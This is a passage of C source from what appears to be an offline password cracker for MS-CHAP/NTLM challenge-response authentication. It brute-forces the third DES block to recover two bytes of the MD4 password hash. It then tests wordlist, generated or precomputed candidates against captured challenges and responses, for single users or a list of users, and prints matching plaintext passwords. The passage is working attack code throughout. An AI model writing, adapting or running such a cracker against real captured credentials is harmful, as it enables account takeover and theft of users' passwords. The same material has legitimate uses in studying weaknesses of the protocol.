		for(m = 0; m < 256; m++) {
			for(n = 0; n < 256; n++) {
				
				DesKey[0] = m;
				DesKey[1] = n;
				DesKey[2] = DesKey3[i];
				DesKey[3] = DesKey[4] = DesKey[5] = DesKey[6] = DesKey[7] = 0x01;

				DESencrypt( challenge, 8, DesKey ,DesHash);

				if ( ! memcmp(DesHash,DesOrg3,8) ) {  
					
					memcpy(DES3_last2,DesKey,3);
					
					if(check) {
						printf("Input of third DES block (last two octets of the MD4 Pwd Hash with parity correction and padding):");
						print_hex(DES3_last2,3);printf("01 01010101\n");
					}
					
					DES3_last2[0] &= 0xfe;
					DES3_last2[0] |= ((DES3_last2[1] >> 7) & 1);
					
					DES3_last2[1] <<= 1; 
					DES3_last2[1] &= 0xfc; 
					DES3_last2[1] |= ((DES3_last2[2] >> 6) & 3);
					
					if(check) {
						printf("Last two octets of MD4 Password Hash without DES parity correction and padding:");
						print_hex(DES3_last2,2);printf("\n");
					}
					n = 256;n = 256;i = 4;
					found=1;
				}
			}
		}
	}
	
	if(!found) { printf("\nError: No matching value found. Check your input ...\n"); usage(); } 
	
	if(check) {	// -c set ?
		printf("\n(Go -> hit enter) or Ctrl-C");
		getchar();
		printf("\n");
	}

	// read filename if no one given use wordlist.txt
	if( filename == NULL ) filename = "wordlist.txt";
		
	if(check) printf("Using File: %s\n",filename);
	
	if((fpFilename = fopen(filename, "r")) == NULL ) { printf("\nError: File error\n\n"); usage(); }	
	
	// Main password cracking loop:	
	while(fgets(line,MAXPWDLENGTH,fpFilename) != NULL) { 
		pwdlength = strlen(sPwd.pwd)-1; 
		sPwd.pwd[pwdlength] = 0;
		
		// prepare unicode transformation (it's faster than malloc)
		slen = pwdlength*2;
		u_char str[slen];
		
		// quick'n dirty, but fast :) unicode transformation (abcd -> ab00cd00)
		for(m = 0; m < pwdlength; m++) {
			*(((u_short *) str) + m) = *(u_char *)(sPwd.pwd+m);  
		}
		
		// MD4 calculation
		md4(str,md4hashvalue);
		rounds += 1;
		
		// Are the last two octets of the MD4 Hash the same like the given one ? Yes -> generate and compare the 1st DES Hash
		if( *(u_short *) (md4hashvalue+14) == *(u_short *)DES3_last2 ) {
			
			DESParityCorrection(md4hashvalue, md4hashvalue1_fixed_key);
			DESParityCorrection(md4hashvalue+7, md4hashvalue2_fixed_key);
			
			if(check) {
				printf("trying DES1: ");
				print_hex(md4hashvalue1_fixed_key,8)  ;printf(" DES2: ");
				print_hex(md4hashvalue2_fixed_key,8)  ;printf(" Last two bytes: ");
				print_hex(md4hashvalue+14,2);printf(" ");
				printf("  Pwd=%s  Count: %llu  \n",sPwd.pwd,rounds);
			}
			DESencrypt( challenge, 8, md4hashvalue1_fixed_key ,DesHash);
			
			// Is the 1st DES Hash also matching ? Yes -> generate and compare the 2nd DES Hash
			if(*(u_long *)DesOrg1 == *(u_long *)DesHash) { 
				if(check) { printf("DES1: ");print_hex(DesHash,8);printf("(match !!) \n"); };
				
				DESencrypt( challenge, 8, md4hashvalue2_fixed_key ,DesHash);
				if(*(u_long *)DesOrg2 == *(u_long *)DesHash) {
					if(check) {
						printf("DES2: ");print_hex(DesHash,8);printf("(match !!)\n");
						printf("%llu words checked ...\n",rounds);
					}
					printf("\nMatching Password = [%s] ",sPwd.pwd);
					if(username != NULL) printf(" Username: %s\n\n",username);
					else printf("\n\n");
					fclose(fpFilename);
					return(EXIT_SUCCESS); // Password found, leave ...
				}
			}
		}
		
		if(output) {
			print_hex(md4hashvalue,16);printf(" ");
			print_hex(md4hashvalue+14,2);
			printf("  String=%s\n",sPwd.pwd);
		} 
	} 
	
	fclose(fpFilename);
	
	// Password cracking -> nothing found
	printf("\nBad luck. Nothing found. %llu words compared ...\n\n",rounds);
	
	return(EXIT_FAILURE);
}

u_int BruteforceMD4finder(u_char *fileread, USER *user ) {
	
	FILE 	*fpr;
	u_char   sPwd[16];
	u_char   DESHash[24];
	
	if((fpr = fopen(fileread , "r")) == NULL ) { printf("\nError: opening file %s\n\n",fileread); usage(); }
	
	while(!ferror(fpr))  {	
		if((fread(sPwd,sizeof(sPwd),1,fpr)) == 0 ) break;
		if((fread(DESHash,sizeof(DESHash),1,fpr)) == 0 ) break;
		// a lame 'n lazy compare algorithm
		if(!memcmp(user->DESHash1,DESHash,8)) {
			if(!memcmp(user->DESHash2,DESHash+8,8)) {
				if(!memcmp(user->DESHash3,DESHash+16,8)) { 
					printf("Match ! Username: %s  Password: %s\n\n",user->username,sPwd);
					break;
				}
			}
		}
	}
	if(ferror(fpr)) { printf("Error: reading file %s\n\n",fileread);exit(0); } 
		
	fclose(fpr);
	
	return(EXIT_SUCCESS);
}

// main function
int main(int argc, char **argv) { 	
    
	u_char *filename = NULL;
	u_char *userlist = "userlist.txt";
	u_char *alpha = NULL;
	u_char *bf_fileread;
	u_char bruteforce=0;
	u_char DESHashSet = 0;
	u_char userlistset = 0;
	u_char pwdgenset = 0;
	
	u_char challenge[8] = { 0xde, 0xad, 0xde, 0xad, 0xde, 0xad, 0xde, 0xad }; // in case -c is not set
	u_char DesOrg1[8];
	u_char DesOrg2[8];
	u_char DesOrg3[8];
	u_char Response[24];
	u_int  c,ret;
	u_char *prefix = ""; // prefix for the generator function
	USER user;
		
	PrgName = argv[0];
	allowed_alphalength = strlen(allowed_alphabet);
		
	while((c = getopt(argc, argv, "l:a:w:t:f:u:c:p:b:ovh-?/")) != EOF)
    {      
        switch (c)
        {
			case 'f':
				if((checkinput(allowed_alphabet, allowed_alphalength, optarg, strlen(optarg))) == EXIT_FAILURE ) {
					printf("Error: Wrong Filename format\n");
					exit(EXIT_FAILURE);
				}
				filename = optarg;
				break;
			case 'l': 
				pwdlength = atoi(optarg);
				pwdgenset = 1;
				break;
			case 'a':
				if(alpha != NULL) { printf("Error: you can't use -a and -w at the same time�\n"); exit(1); }
				alpha = optarg;
				alphalength = strlen(alpha);
				pwdgenset = 1;
				break;
			case 'w':
				if(alpha != NULL) { printf("Error: you can't use -a and -w at the same time�\n"); exit(1); }
				alpha = optarg;
				alpha = getalpha(alpha); // substitute wildcards (a-z ; A-Z; 0-9)
				alphalength = strlen(alpha); 
				pwdgenset = 1;
				break;
			case 'u':
				if((checkinput(allowed_alphabet, allowed_alphalength, optarg, strlen(optarg))) == EXIT_FAILURE ) {
					printf("Error: Wrong Filename format\n");
					exit(EXIT_FAILURE);
				}
				userlist = optarg;
				userlistset = 1;
				break;
			case 'b':
				if((checkinput(allowed_alphabet, allowed_alphalength, optarg, strlen(optarg))) == EXIT_FAILURE ) {
					printf("Error: Wrong Filename format\n");
					exit(EXIT_FAILURE);
				}
				bf_fileread = optarg;
				bruteforce = 1;
				break;
			case 't':	
				StrToHex(optarg,strlen(optarg),Response,sizeof(Response)); // yes, I know sscanf()
				memcpy(DesOrg1,Response,sizeof(DesOrg1));
				memcpy(DesOrg2,Response+8,sizeof(DesOrg2));
				memcpy(DesOrg3,Response+16,sizeof(DesOrg3));
				
				printf("DES1: ");
				print_hex(DesOrg1,8);printf("\n");
				printf("DES2: ");
				print_hex(DesOrg2,8);printf("\n");
				printf("DES3: ");
				print_hex(DesOrg3,8);printf("\n");
				DESHashSet = 1;
				break;
			
			case 'c':
				StrToHex(optarg,strlen(optarg),challenge,sizeof(challenge));
				break;
			case 'p':
				#ifdef PARANOID
				if((checkinput(allowed_alphabet, allowed_alphalength, optarg, strlen(optarg))) == EXIT_FAILURE ) {
					printf("Error: Wrong Filename format\n");
					exit(EXIT_FAILURE);
				}
				#endif
				prefix=optarg;
				break;
			case 'o':
				output=1;
				break;
			case 'v':
				check=1;
				break;
			
			default:
				usage();
				
        }
	}
	
	if(pwdgenset) {
		if(pwdlength > 15) { printf("\nError: max. Password length = 15 characters.\n"); exit(1); }
		if(pwdlength < 1 ) { printf("\nError: min. Password length = 1 character.\n"); exit(1); }
		if(alphalength < 1){ printf("\nError: you have to set the alphabet\n"); exit(1); }
	}
	
	if((filename != NULL) && (pwdgenset)) { printf("\nError: wordfile(-f) *and* pwd generator(-l,-a,-w) makes no sense.\n\n"); exit(1); }
	if((bruteforce) && ((pwdgenset) || (filename != NULL))) { printf("\nError: bruteforcefile *and* wordfile(-f) or pwd generator(-l,-a,-w) makes no sense.\n\n"); exit(1); }
		
	if(userlistset) { // do we have multiple users in a userlist file ?
		while((getuser(&user, userlist)) == -2) {
			
			if(check) { // verbose ouput ?
				printf("User      : %s\n",user.username);
				printf("Challenge : "); print_hex(user.challenge,8); printf("\n");
				printf("DESHash1  : "); print_hex(user.DESHash1,8); printf("\n");
				printf("DESHash2  : "); print_hex(user.DESHash2,8); printf("\n");
				printf("DESHash3  : "); print_hex(user.DESHash3,8); printf("\n");
			}
			
			// set global username 
			username = user.username;
			
			// Use password generator function for password cracking
			if((pwdgenset) && (!bruteforce) ) ret = PwdGenMD4finder(alpha,user.challenge,user.DESHash1,user.DESHash2,user.DESHash3,prefix);
			
			// Use a wordlist file for password cracking
			if((!pwdgenset) && (!bruteforce)) ret = WordlistMD4finder(filename,user.challenge,user.DESHash1,user.DESHash2,user.DESHash3);
				
			// Use a bruteforce test for password cracking
			if(bruteforce) ret = BruteforceMD4finder(bf_fileread, &user);
		}
	}
	else {  // we don't have a userlist file
			if( ! DESHashSet ) { printf("\nError: No DES Hash value set\n"); usage(); }
			
			if(check) {
				printf("Challenge: ");
				print_hex(challenge,8);printf("\n");
			}
			// set global username
			username = NULL;
			
			// Use Password Generator Function for password cracking
			if((alphalength != 0) && (pwdlength != 0) && (!bruteforce)) ret = PwdGenMD4finder(alpha,challenge,DesOrg1,DesOrg2,DesOrg3,prefix);
			
			// Use a wordlist file for password cracking
			if((alphalength == 0) && (pwdlength == 0) && (!bruteforce)) ret = WordlistMD4finder(filename,challenge,DesOrg1,DesOrg2,DesOrg3);
				
			// Use a bruteforce test for password cracking
			if(bruteforce) {
				strcpy(user.username,"n.a.");
				memcpy(user.challenge,challenge,8);
				memcpy(user.DESHash1,DesOrg1,8);
				memcpy(user.DESHash2,DesOrg2,8);
				memcpy(user.DESHash3,DesOrg3,8);
				ret = BruteforceMD4finder(bf_fileread, &user);
			}
	}
	
	exit(EXIT_SUCCESS);
}
	
